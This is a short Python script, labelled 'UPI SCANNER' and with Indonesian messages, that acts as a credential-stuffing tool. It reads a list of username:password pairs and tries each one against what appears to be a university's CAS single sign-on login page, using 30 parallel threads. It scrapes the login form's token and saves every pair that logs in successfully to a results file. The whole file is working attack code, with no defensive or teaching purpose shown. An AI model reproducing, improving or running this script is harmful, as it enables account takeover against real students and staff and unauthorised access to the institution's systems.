import os, time, platform, requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
flag = '\x1b[47;30m'
pf = platform.uname()
me = pf.release
sukses = []
bn = f"\r{flag}  {red} UPI  SCANNER   \n"

def upi(usr, pwd):
    ses = req.Session()
    url = 'https://sso.upi.edu/cas/login'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')[2]['value']
    dat = {'username':usr,  'password':pwd, 
		 'execution':tok, 
		 '_eventId':'submit', 
		 'submit':'LOGIN'}
    gas = ses.post(url, data=dat).text
    res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
    if res == 'success':
        print(f"{off}[{green}found{off}]{white} - {green}{usr}{cyan}:{green}{pwd}{off}")
        with open('hasil_upi.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}[{red}error{off}]{white} - {red}{usr}{red}:{red}{pwd}{off}")

def progres():
    try:
        list = input(f"{off}[{white}+{off}]{white}Input file user:pw {white} : ")
        with open(list, 'r') as file:
            lines = file.readlines()
            os.system('clear')
            print(f"{off}[{yellow}+{off}]{white}Total {red}{len(lines)} {white}Akun Terdeteksi \n")
            with ThreadPoolExecutor(max_workers=30) as crot:
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0] 
                    pswd = data.split(':')[1]
                    crot.submit(upi, user, pswd)
                else:
                    if len(sukses) > 0:
                        print(f"{cyan}[{white}✓{cyan}]{green} {len(sukses)}{white} data login tersimpan ")
                    else:
                        pass

    except FileNotFoundError:
        print(f" {cyan}[{white}!{cyan}]{red} File tidak ditemukan :( ")
    except KeyboardInterrupt:
        exit()

def main():
	os.system('clear')
	print(bn)
	progres()
	
if __name__ == '__main__':
    main()
